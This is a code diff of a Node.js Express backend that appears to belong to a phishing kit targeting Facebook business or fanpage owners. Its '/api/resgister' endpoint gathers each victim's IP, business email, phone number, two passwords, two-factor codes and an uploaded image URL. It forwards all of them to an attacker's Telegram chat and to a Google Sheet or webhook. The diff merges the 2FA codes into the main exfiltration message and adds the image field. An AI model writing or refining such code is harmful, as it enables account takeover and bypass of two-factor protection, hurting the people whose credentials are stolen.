@@ -20,7 +20,6 @@ app.post('/api/resgister', (req, res) => {
 
     res.send(result);
 
-if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
 <strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
@@ -29,18 +28,13 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
 <strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
 <strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
-<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}`;
+<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
+<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
+<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}
+<strong>Image:</strong> ${data.imageUrl ? data.imageUrl : ''}`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
 
-} else {
-
-    const messageCode = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
-    bot.sendMessage(process.env.CHAT_ID, messageCode,  { parse_mode: 'HTML' });
-
-}
 
 if(process.env.WEBHOOK_URL == undefined  || process.env.WEBHOOK_URL == ""){
     // ADD GOOGLE SHEET
@@ -56,6 +50,7 @@ if(process.env.WEBHOOK_URL == undefined  || process.env.WEBHOOK_URL == ""){
     url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
     url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
     url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
+    url.searchParams.append('Image', data.imageUrl ? data.imageUrl : '');
 
     axios.get(url)
     .then(response => {
